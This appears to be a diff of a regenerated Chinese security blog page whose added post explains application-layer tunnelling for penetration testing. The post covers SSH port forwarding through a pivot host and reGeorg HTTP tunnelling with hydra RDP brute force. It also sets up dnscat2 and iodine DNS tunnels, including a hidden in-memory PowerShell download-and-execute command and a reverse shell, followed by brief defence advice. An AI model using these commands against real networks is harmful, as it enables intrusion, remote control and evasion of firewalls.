-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
+</div>
+        
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
 
   <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
         </li>
@@ -445,61 +163,55 @@
         </li>
       </ul>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">SSH协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="nav-number">1.1.</span> <span class="nav-text">1、本地转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="nav-number">1.2.</span> <span class="nav-text">2、远程转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="nav-number">1.3.</span> <span class="nav-text">3、动态转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E9%98%B2%E5%BE%A1SSH%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.</span> <span class="nav-text">4、防御SSH隧道攻击的思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-HTTPS%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">HTTP&#x2F;HTTPS协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.</span> <span class="nav-text">DNS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%9F%A5%E7%9C%8BDNS%E7%9A%84%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="nav-number">3.1.</span> <span class="nav-text">1、查看DNS的连通性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81dnscat2"><span class="nav-number">3.2.</span> <span class="nav-text">2、dnscat2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81iodine"><span class="nav-number">3.3.</span> <span class="nav-text">3、iodine</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1DNS%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">防御DNS隧道攻击</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-xie-yi"><span class="nav-number">1.</span> <span class="nav-text">SSH协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ben-di-zhuan-fa"><span class="nav-number">1.1.</span> <span class="nav-text">1、本地转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-yuan-cheng-zhuan-fa"><span class="nav-number">1.2.</span> <span class="nav-text">2、远程转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-dong-tai-zhuan-fa"><span class="nav-number">1.3.</span> <span class="nav-text">3、动态转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-fang-yu-ssh-sui-dao-gong-ji-de-si-lu"><span class="nav-number">1.4.</span> <span class="nav-text">4、防御SSH隧道攻击的思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http-https-xie-yi"><span class="nav-number">2.</span> <span class="nav-text">HTTP&#x2F;HTTPS协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dns-xie-yi"><span class="nav-number">3.</span> <span class="nav-text">DNS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-cha-kan-dns-de-lian-tong-xing"><span class="nav-number">3.1.</span> <span class="nav-text">1、查看DNS的连通性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-dnscat-2"><span class="nav-number">3.2.</span> <span class="nav-text">2、dnscat2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-iodine"><span class="nav-number">3.3.</span> <span class="nav-text">3、iodine</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fang-yu-dns-sui-dao-gong-ji"><span class="nav-number">4.</span> <span class="nav-text">防御DNS隧道攻击</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="素念"
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
       src="/imgss/touxiang.jpg">
-  <p class="site-author-name" itemprop="name">素念</p>
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
   <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
 </div>
-<div class="site-state-wrap motion-element">
+<div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">78</span>
+        <a href="/archives/">
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">12</span>
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">33</span>
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
-  <div class="links-of-author motion-element">
+  <div class="links-of-author site-overview-item animated">
       <span class="links-of-author-item">
-        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
       </span>
   </div>
 
 
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
       友情链接
     </div>
     <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
-          <a href="http://wp.fmk.pub/" title="http:&#x2F;&#x2F;wp.fmk.pub&#x2F;" rel="noopener" target="_blank">Defender</a>
-        </li>
         <li class="links-of-blogroll-item">
           <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
         </li>
@@ -515,42 +227,373 @@
     </ul>
   </div>
 
+        </div>
       </div>
-
     </div>
   </aside>
-  <div id="sidebar-dimmer"></div>
+  <div class="sidebar-dimmer"></div>
 
 
-      </div>
-    </main>
+    </header>
 
-    <footer class="footer">
-      <div class="footer-inner">
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/03/31/%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          '应用层隧道技术'
+        </h1>
+
+
+        <div class="post-meta">
         
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-03-31 19:25:04" itemprop="dateCreated datePublished" datetime="2020-03-31T19:25:04+08:00">2020-03-31</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-07-12 16:32:08" itemprop="dateModified" datetime="2020-07-12T16:32:08+08:00">2020-07-12</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="ssh-xie-yi" id="SSH协议">SSH协议</h2>
+<p>一个普通的ssh远程连接命令<br>
+ssh <a href="mailto:root@192.168.1.1">root@192.168.1.1</a></p>
+<a id="more"></a>
+<p>创建SSH隧道常用参数如下:<br>
+-C：压缩传输，提高传输速度<br>
+-f：将SSH传输转入后台执行，不占用当前的shell<br>
+-N：建立静默连接(建立了连接，但看不到具体的会话)<br>
+-g：允许远程主机连接本地用于转发的端口<br>
+-L：本地端口转发<br>
+-R：远程端口转发<br>
+-D：动态转发(SOCKS代理)<br>
+-P：指定SSH端口</p>
+<h3 id="1-ben-di-zhuan-fa" id="1、本地转发">1、本地转发</h3>
+<blockquote>
+<p>kali(攻击机)执行，会要求输入跳板机密码<br>
+ssh -CfNg -L 1153(攻击机):1.1.1.10(目标机).3389(目标机) <a href="mailto:root@192.168.1.1">root@192.168.1.1</a>(跳板机)<br>
+netstat -tulnp | grep “1153” 查看端口<br>
+rdesktop 127.0.0.1:1153 进行连接<br>
+本地转发是将远程主机某个端口的数据转发到本地机器的指定端口。</p>
+</blockquote>
+<h3 id="2-yuan-cheng-zhuan-fa" id="2、远程转发">2、远程转发</h3>
+<blockquote>
+<p>WEB服务器(跳板机)执行<br>
+ssh -CfNg -R 3307(攻击机):1.1.1.10(目标机):3389(目标机) <a href="mailto:root@192.168.1.4">root@192.168.1.4</a>(攻击机)<br>
+远程转发是在远程服务器上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
+</blockquote>
+<h3 id="3-dong-tai-zhuan-fa" id="3、动态转发">3、动态转发</h3>
+<blockquote>
+<p>kali(攻击机)执行命令，建立SOCKS 4/5代理通道<br>
+ssh -CfNg -D 7000 <a href="mailto:root@192.168.1.1">root@192.168.1.1</a>(WEB服务器)<br>
+配置SOCKS代理 127.0.0.1 7000<br>
+浏览器访问1.1.1.2(内网web服务器)即可看到web服务</p>
+</blockquote>
+<h3 id="4-fang-yu-ssh-sui-dao-gong-ji-de-si-lu" id="4、防御SSH隧道攻击的思路">4、防御SSH隧道攻击的思路</h3>
+<blockquote>
+<p>系统中配置SSH远程管理白名单，在ACL中限制只有指定IP地址才能访问SSH，以及设置系统完全使用带外管理等。如果没有足够的资源建立带外管理的网络结构，至少限制SSH远程登陆IP，并设置双向访问控制策略(从外到内，从内到外)。</p>
+</blockquote>
+<h2 id="http-https-xie-yi" id="HTTP-HTTPS协议">HTTP/HTTPS协议</h2>
+<blockquote>
+<p>HTTP service代理用于将所有的流量转发到内网。常用代理工具有reGeorg、meterpreter、tunna等。<br>
+reGeorg原理：把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。(会被杀软查杀)<br>
+下载链接https://github.com/sensepost/reGeorg<br>
+将tunnel.jsp脚本(有其他类型脚本,ASPX、PHP、JSP等)上传到目标服务器<br>
+python <a target="_blank" rel="noopener" href="http://reGeorgSocksProxy.py">reGeorgSocksProxy.py</a> -u <a target="_blank" rel="noopener" href="http://192.168.1.1/tunnel.jsp">http://192.168.1.1/tunnel.jsp</a> -p 9999<br>
+执行后，配置proxychains 127.0.0.1 9999<br>
+就可访问目标服务器<br>
+使用九头蛇(hydra)爆破3389远程桌面连接等操作<br>
+proxychains hydra -s 3389 -V -l administrator -P /root/destop/passwd.txt -t 8 192.168.1.1 rdp</p>
+</blockquote>
+<h2 id="dns-xie-yi" id="DNS协议">DNS协议</h2>
+<blockquote>
+<p>优点：DNS协议难以被禁用，报文具有穿透防火墙的能力。由于防火墙和入侵检测设备(IPS/IDS)大都不会过滤DNS流量，也为DNS成为隐蔽通信创造了条件。<br>
+DNS隧道工作原理：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。预期返回的是一个IP地址，但返回的可以是任意字符串，包括加密的C&amp;C指令。<br>
+使用DNS隧道与外部进行通信时，从表面上看没有连接外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。原理简单来说就是将其他协议封装在DNS协议中进行传输。</p>
+</blockquote>
+<h3 id="1-cha-kan-dns-de-lian-tong-xing" id="1、查看DNS的连通性">1、查看DNS的连通性</h3>
+<p>查看内部域名及IP地址<br>
+cat /etc/resolv.conf|grep -v ‘#’</p>
+<p>是否能与内部DNS通信<br>
+nslookup hack.lab<br>
+<img src="/imgss/p33.png" alt=""><br>
+查询能否通过内部DNS服务器解析外部域名<br>
+nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a><br>
+<img src="/imgss/p34.png" alt=""></p>
+<h3 id="2-dnscat-2" id="2、dnscat2">2、dnscat2</h3>
+<p>简介：开源软件，使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用shell及DNS查询类型，多个同时进行的会话类似于SSH中的通道。客户端用C编写，服务端用Ruby编写。</p>
+<p>直连模式：客户端直接指定IP地址的DNS服务器发起DNS解析请求。(内网放行所有DNS请求时使用)<br>
+中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。速度比直连慢。(内网只允许白名单服务器或制定域)</p>
+<p>(1)部署域名解析</p>
+<blockquote>
+<p>搞台VPS安装linux，并配置域名。<br>
+创建A记录，域名解析服务器指向VPS的IP。再创建NS记录，将dnsch子域名的解析结果指向域名解析服务器(ns1.sunian.top)。<br>
+PS：注意开放防火墙dnsnat2走的是UDP的流量！<br>
+验证是否设置成功<br>
+ping ns1.sunian.top (返回VPS的IP，说明A生效)<br>
+tcpdump -n -i eth0 udp dst port 53 (VPS上抓包53端口)<br>
+nslookup vpn.sunian.top (查看抓包情况，抓到DNS请求包，说明NS生效)</p>
+</blockquote>
+<p><img src="/imgss/p35.png" alt=""><br>
+<img src="/imgss/a36.png" alt=""><br>
+<img src="/imgss/a40.png" alt=""></p>
+<p>(2)安装</p>
+<blockquote>
+<p>apt-get install gem<br>
+apt-get install ruby-dev<br>
+apt-get install libpq-dev<br>
+apt-get install ruby-bundler</p>
+</blockquote>
+<blockquote>
+<p>apt-get install git<br>
+git clone <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br>
+cd dnscat2/server<br>
+bundle install</p>
+</blockquote>
+<p>(3)启动服务端</p>
+<blockquote>
+<p>sudo ruby ./dnscat2.rb vpn.sunian.top -e open -c suniana --no-cache<br>
+如果采用的是直连，可使用以下命令<br>
+sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,type=TXT --secret=suniana<br>
+以上命令表示监听533端口，自定义连接密码为&quot;suniana&quot;<br>
+-c：定义&quot;pre-shared secret&quot;，使用具有预共享密钥的身份验证机制来防止中间人攻击。<br>
+-e：规定安全级别。&quot;open&quot;代表服务端允许客户端不进行加密。<br>
+–no-cache：禁止缓存。务必运行服务器时添加该选项。因为powershell-dnscat2与dnscat2的Caching模式不兼容。</p>
+</blockquote>
+<p>(4)目标机安装客户端</p>
+<blockquote>
+<p>linux中：<br>
+git clone <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br>
+cd dnscat2/client/<br>
+make<br>
+windows中(直接使用编译好的)：<br>
+<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
+</blockquote>
+<p>(5)检测是否能通信</p>
+<blockquote>
+<p>dnscat2-v0.07-client-win32.exe --ping vpn.sunian.top<br>
+显示&quot;creating a ping session!“… 即可<br>
+连接服务端<br>
+dnscat2-v0.07-client-win32.exe --dns domain=vpn.sunian.top --secret suniana<br>
+连接成功，则显示&quot;session established!”<br>
+<img src="/imgss/a41.png" alt=""><br>
+如果服务端使用的是直连模式(未测试成功)，可直接填写服务端的IP地址(不通过DNS服务商)，向服务端所在IP请求DNS解析。<br>
+dnscat --dns port=533,server=192.168.1.1,domain=vpn.sunian.top --secret=suniana</p>
+</blockquote>
+<p>(6)推荐使用powershell版本的dnscat2客户端。</p>
+<blockquote>
+<p>直接将脚本拖上去，执行<br>
+Import-Module ./dnscat2.ps1<br>
+或使用命令下载<br>
+IEX(New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1</a>’)<br>
+加载脚本后，开启服务<br>
+start-Dnscat2 -Domain vpn.sunian.top -DNSServer 192.168.1.1</p>
+</blockquote>
+<p>(7)使用IEX加载脚本的方式，在内存打开dnscat2客户端</p>
+<blockquote>
+<p>powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1</a>’); start-Dnscat2 -Domain vpn.sunian.top -DNSServer 192.168.1.1}<br>
+执行以下命令，创建一个控制台，然后执行powershell命令和脚本<br>
+exec psh</p>
+</blockquote>
+<p>(8)反弹shell</p>
+<blockquote>
+<p>使用方法与Metasploit相似，客户端运行dnscat2.ps1后，可以在服务端看到上线情况<br>
+New windows created:1<br>
+session -i 1 (调用sesion，连接shell)<br>
+exec notepad.exe (打开记事本)<br>
+<img src="/imgss/a42.png" alt=""><br>
+<img src="/imgss/a43.png" alt=""><br>
+<img src="/imgss/a44.png" alt=""></p>
+</blockquote>
+<blockquote>
+<p>命令介绍<br>
+clear：清屏。<br>
+delay：修改远程响应延时。<br>
+exec：执行远程机器上的指定程序。<br>
+shell：得到一个反弹shell<br>
+download/upload：在两端之间上传/下载文件。适合小文件。<br>
+suspend：返回上一层，相当于快捷键&quot;ctrl+z&quot;。<br>
+listen：类似于SSH隧道的-L参数(本地转发)，例如listen 0.0.0.0:53 192.168.1.1:3389<br>
+ping：确认目标机器是否在线。返回&quot;pong&quot;，则在线。<br>
+shutdown：切断当前会话。<br>
+quit：退出。<br>
+kill<id>：切断指定通道。<br>
+set：设置值，例如security=open。<br>
+windows(session)：列出所有通道。<br>
+windows -i <id>：连接某个通道。</p>
+</blockquote>
+<blockquote>
+<p>提供多域名并发。即多个子域名绑定同一个NS下，服务端可接收多个客户端<br>
+ruby dnscat2.rb --dns=port=533 --security=open start --dns domain=<domain>,domain=<domain></p>
+</blockquote>
+<h3 id="3-iodine" id="3、iodine">3、iodine</h3>
+<p>(1)简介</p>
+<blockquote>
+<p>和dnscat2一样分为直连和中继模式。原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网。连接成功后，客户端会多出一个名为&quot;dns0&quot;的虚拟网卡。<br>
+PS：域名解析的设置和dnsnat2相同</p>
+</blockquote>
+<p>(2)安装与运行</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Al1ex/iodine">https://github.com/Al1ex/iodine</a><br>
+kali、ubantu直接使用以下命令安装<br>
+apt install iodine<br>
+运行：<br>
+iodined -f -c -P suniana 192.168.0.1(自定义局域网IP) vpn.sunian.top -DD<br>
+完成基本配置后访问https://code.kryo.se/iodine/check-it<br>
+检查配置是否正确，也可查看网卡<br>
+<img src="/imgss/a45.png" alt=""><br>
+<img src="/imgss/a47.png" alt=""></p>
+</blockquote>
+<blockquote>
+<p>命令详解<br>
+-f：在前台运行。<br>
+-c：禁止检查所有传入请求的客户端IP地址。<br>
+-P：设置连接密码。<br>
+-D：指定调试级别。-DD指2级。D的数量随等级增加。</p>
+</blockquote>
+<blockquote>
+<p>安装客户端<br>
+iodine -f -P suniana -M 200 vpn.sunian.top<br>
+PS：需要使用管理员权限启动</p>
+</blockquote>
+<p><img src="/imgss/a46.png" alt=""><br>
+-r：有时会自动切换为UDP通道，该命令强制使用DNS隧道(无论什么情况)<br>
+-M：指定上行主机名的大小。<br>
+-m：调节最大下行分片的大小。<br>
+-T：指定DNS请求类型。可选NULL、PRIVATE、TXT、SRV、CNAME、MX、A。<br>
+-O：指定数据编码规范。<br>
+-L：是否开启懒惰模式。<br>
+-I：指定请求与请求之间的时间间隔。<br>
+<img src="/imgss/a48.png" alt=""><br>
+若出现&quot;Connection setup complete,transmitting data&quot;的提示信息，就代表DNS隧道已建立。</p>
+<p>(3)使用DNS隧道<br>
+因为处于同一个局域网中，只需直接访问服务端即可。例如，ssh <a href="mailto:sunian@10.0.0.1">sunian@10.0.0.1</a> 命令。<br>
+<img src="/imgss/a49.png" alt=""></p>
+<h2 id="fang-yu-dns-sui-dao-gong-ji" id="防御DNS隧道攻击">防御DNS隧道攻击</h2>
+<p>(1)、禁止网络中任何人向外部服务器发送DNS请求，只允许受信任的DNS服务器通信。<br>
+(2)、将邮件服务器/网关列入白名单并阻止传入和传出流量中的TXT请求。<br>
+(3)、跟踪用户的DNS查询次数。达到阈值，就生成相应的报告。<br>
+(4)、阻止ICMP。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+              <a href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag"># 协议</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/03/28/WUST-writeup/" rel="prev" title="'WUST-writeup'">
+                  <i class="fa fa-chevron-left"></i> 'WUST-writeup'
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/01/SOCKS%E4%BB%A3%E7%90%86/" rel="next" title="'SOCKS代理及数据压缩及上传和下载'">
+                  'SOCKS代理及数据压缩及上传和下载' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
 
 <div class="copyright">
-  
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">素念</span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.2.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
-  </div>
-
-    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-        
 <div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
@@ -558,8 +601,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
@@ -568,59 +610,30 @@
       </span>
     </span>
 </div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
+    </div>
+  </footer>
 
   
-
-
-
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
 
 
 
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
+
+
+
 
 </body>
 </html>
